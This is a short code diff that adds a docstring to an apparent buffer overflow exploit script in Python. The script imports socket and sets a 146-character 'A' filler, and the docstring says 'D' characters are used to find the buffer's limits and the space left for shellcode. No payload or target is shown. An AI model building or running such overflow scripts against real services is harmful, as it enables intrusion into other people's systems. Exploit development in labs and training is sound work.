@@ -1,3 +1,6 @@
+"""uses a sequence of D characters to find out the limits of the buffer
+this lets us see how much space we have to write shellcode"""
+
 import socket
 
 filler = "A" * 146
